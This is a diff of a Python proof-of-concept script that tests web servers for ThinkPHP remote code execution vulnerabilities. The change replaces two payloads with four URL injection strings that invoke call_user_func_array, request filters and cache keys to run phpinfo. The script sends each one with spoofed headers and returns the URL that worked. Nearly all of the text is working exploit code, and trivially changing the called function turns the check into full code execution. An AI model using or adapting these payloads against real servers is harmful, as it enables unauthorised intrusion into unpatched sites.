@@ -28,24 +28,24 @@ def poc(domain_url):
 
         if "http" not in domain_url:
             domain_url = "http://" + domain_url
-        thinkphp50_poc = r"/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
-        thinkphp51_poc = r"/?s=index/\think\Request/input&filter=phpinfo&data=1"
-        
+            
+
+        poc0 = '/index.php/?s=index/\\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1'
+        poc1 = '/index.php/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1'
+        poc2 = '/index.php/?s=index/\\think\Request/input&filter=phpinfo&data=1'
+        poc3 = '/index.php?s=/index/\\think\\request/cache&key=1|phpinfo'
+        poclist = [poc0,poc1,poc2,poc3]
         headers = {
             "Accept": "*/*",
             "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; en) Opera 9.50",
             "X-Forwarded-For":"192.168.1.1"
         }
-        r1 = requests.get(domain_url + thinkphp50_poc, headers=headers,verify=False, timeout =10,allow_redirects=False)
-        if "PHP Version" in r1.text:
-            return 1
-
-        r2 = requests.get(domain_url + thinkphp51_poc, headers=headers, verify=False, timeout =10,allow_redirects=False)
-        if "PHP Version" in r2.text:
-            return 1
-
+        for poc in poclist:
+            r = requests.get(domain_url + poc, headers=headers,verify=False, timeout =10,allow_redirects=False)
+            if "PHP Version" in r.text:
+                return domain_url + poc
+        
         return 0
-
     except Exception as e:
         return 0
 
